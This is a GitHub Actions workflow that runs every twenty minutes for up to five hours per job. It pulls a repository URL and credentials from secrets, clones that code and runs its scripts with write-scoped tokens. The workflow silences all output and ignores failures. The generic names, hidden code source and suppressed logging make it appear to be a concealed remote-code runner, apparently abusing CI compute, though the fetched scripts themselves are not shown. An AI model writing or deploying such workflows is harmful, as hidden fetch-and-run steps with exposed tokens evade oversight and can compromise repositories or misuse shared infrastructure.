name: run
on:
  schedule: [ { cron: "7,27,47 * * * *" } ]
permissions: { contents: write, actions: write }
jobs:
  a:
    runs-on: ubuntu-latest
    timeout-minutes: 300
    concurrency: { group: a, cancel-in-progress: false }
    steps:
      - name: run
        env: { CFG: "${{ secrets.CFG }}", GH_TOKEN: "${{ github.token }}" }
        run: |
          { printf '%s\n' "$CFG" | sed 's/\r$//' > "$RUNNER_TEMP/c"; set -a; . "$RUNNER_TEMP/c"; set +a; rm -f "$RUNNER_TEMP/c"
            git clone -q --depth 1 "$SRC" w && bash w/scripts/runner.sh; } >/dev/null 2>&1 || true
  b:
    runs-on: ubuntu-latest
    timeout-minutes: 300
    concurrency: { group: b, cancel-in-progress: false }
    steps:
      - name: run
        env: { K1: "${{ secrets.K1 }}", K2: "${{ secrets.K2 }}", K3: "${{ secrets.K3 }}", K6: "${{ secrets.K6 }}", GH_TOKEN: "${{ github.token }}" }
        run: git clone -q --depth 1 "https://x-access-token:${K2}@github.com/${K1}.git" w2 >/dev/null 2>&1 && bash w2/engine/run.sh >/dev/null 2>&1 || true
